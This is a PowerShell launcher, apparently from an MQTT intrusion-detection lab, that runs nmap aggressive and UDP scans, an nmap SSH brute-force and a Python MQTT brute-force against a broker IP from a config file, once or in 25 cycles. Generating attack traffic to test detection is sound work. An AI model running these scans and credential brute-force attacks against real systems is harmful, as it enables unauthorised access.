# ============================================================
# MQTT IDS LAB - FULL ATTACK SCRIPT
# ============================================================

$ProjectRoot = Split-Path $PSScriptRoot -Parent
$ConfigPath  = Join-Path $ProjectRoot "configs/network_config.json"
$NetConfig   = Get-Content $ConfigPath | ConvertFrom-Json

$TARGET = $NetConfig.broker_ip

$USERS      = Join-Path $PSScriptRoot "users.txt"
$PASSWORDS  = Join-Path $PSScriptRoot "passwords.txt"
$MQTT_BRUTE = Join-Path $PSScriptRoot "mqtt_bruteforce.py"

Write-Host "============================================================" -ForegroundColor Yellow
Write-Host "                MQTT IDS LAB - ATTACK LAUNCHER              " -ForegroundColor Cyan
Write-Host "============================================================"
Write-Host ""
Write-Host "Target Broker IP: $TARGET" -ForegroundColor Cyan

Write-Host " [1] Run all attacks once"
Write-Host " [2] Run attacks in a loop (25 cycles)"
Write-Host " [3] Exit"
Write-Host ""

$choice = Read-Host "Enter your choice"

switch ($choice) {

# -------------------------------------------------------------
# OPTION 1: RUN ALL ATTACKS ONCE
# -------------------------------------------------------------
"1" {
    Write-Host "`nRunning ALL attacks once..." -ForegroundColor Green
    Write-Host "============================================================"

    Write-Host "`n[1] Aggressive Scan (-A)..." -ForegroundColor Yellow
    nmap -A $TARGET
    Start-Sleep -Seconds 3

    Write-Host "`n[2] UDP Scan (-sU)..." -ForegroundColor Yellow
    nmap -sU $TARGET
    Start-Sleep -Seconds 3

    Write-Host "`n[3] SSH Bruteforce..." -ForegroundColor Yellow
    nmap --script ssh-brute --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
    Start-Sleep -Seconds 3

    Write-Host "`n[4] MQTT Bruteforce..." -ForegroundColor Yellow
    python $MQTT_BRUTE $TARGET

    Write-Host "`nALL ATTACKS COMPLETED." -ForegroundColor Green
    Pause
}

# -------------------------------------------------------------
# OPTION 2: CONTINUOUS LOOP
# -------------------------------------------------------------
"2" {

    $LOOP_COUNT = 25
    Write-Host "`nRunning $LOOP_COUNT attack cycles..." -ForegroundColor Cyan

    for ($i = 1; $i -le $LOOP_COUNT; $i++) {

        Write-Host "`n------------------------------------------------------------" -ForegroundColor Blue
        Write-Host "[CYCLE $i/$LOOP_COUNT] Full attack sequence..." -ForegroundColor Cyan
        Write-Host "Timestamp: $(Get-Date)" -ForegroundColor DarkGray

        Write-Host "`n[1] Aggressive Scan (-A)..." -ForegroundColor Yellow
        nmap -A $TARGET
        Start-Sleep -Seconds 3

        Write-Host "`n[2] UDP Scan (-sU)..." -ForegroundColor Yellow
        nmap -sU $TARGET
        Start-Sleep -Seconds 3

        Write-Host "`n[3] SSH Bruteforce..." -ForegroundColor Yellow
        nmap --script ssh-brute --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
        Start-Sleep -Seconds 3

        Write-Host "`n[4] MQTT Bruteforce..." -ForegroundColor Yellow
        python $MQTT_BRUTE $TARGET

        Write-Host "`n===== Cycle $i completed =====" -ForegroundColor Green
        Start-Sleep -Seconds 5
    }

    Write-Host "`nAll $LOOP_COUNT cycles completed!" -ForegroundColor Green
    Pause
}

# -------------------------------------------------------------
# EXIT
# -------------------------------------------------------------
"3" {
    Write-Host "Exiting..." -ForegroundColor Yellow
}

default {
    Write-Host "`nInvalid choice." -ForegroundColor Red
}
}

Write-Host "`n============================================================"
Write-Host " ATTACK SCRIPT FINISHED"
Write-Host "============================================================"

Pause
